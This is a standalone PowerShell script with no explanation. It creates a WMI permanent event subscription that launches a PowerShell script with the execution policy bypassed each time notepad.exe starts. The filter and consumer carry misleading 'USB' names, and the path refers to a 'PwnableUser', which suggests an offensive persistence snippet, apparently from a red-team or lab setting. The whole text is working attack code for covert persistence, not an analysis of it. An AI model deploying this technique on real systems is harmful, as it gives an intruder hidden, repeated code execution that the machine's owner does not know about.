$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()

$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'"
$filter.Name = "USBFilter"
$filter.EventNamespace = 'root\cimv2'

$result = $filter.Put()
$filterPath = $result.Path

$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = 'USBConsumer'
$consumer.CommandLineTemplate = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe –ExecutionPolicy Bypass -file C:\Users\PwnableUser\Desktop\scripts\script.ps1"
$consumer.ExecutablePath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$consumer.WorkingDirectory = "C:\Users\PwnableUser\Desktop\scripts"
$result = $consumer.Put()
$consumerPath = $result.Path

$bind = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()

$bind.Filter = $filterPath
$bind.Consumer = $consumerPath
$result = $bind.Put()
$bindPath = $result.Path